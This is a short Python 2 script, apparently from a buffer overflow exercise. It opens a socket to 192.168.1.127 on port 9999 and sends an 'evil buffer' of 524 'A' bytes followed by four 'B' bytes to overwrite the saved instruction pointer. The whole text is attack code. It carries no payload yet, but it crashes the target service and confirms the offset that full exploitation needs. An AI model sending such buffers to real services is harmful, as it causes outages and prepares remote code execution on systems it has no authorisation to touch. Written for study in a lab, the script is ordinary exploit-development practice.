#!/usr/bin/python
import socket

try:
  print "\n[+] Sending evil buffer..."
  offset = "A" * 524
  eip = "B" * 4

  buffer = offset + eip

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.1.127", 9999))
  s.send(buffer)
  
  s.close()
 
  print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
  print "\n[+] Sending buffer: " + buffer
  print "\n[+] Done!"
  
except:
  print "\n[+] Could not connect!"
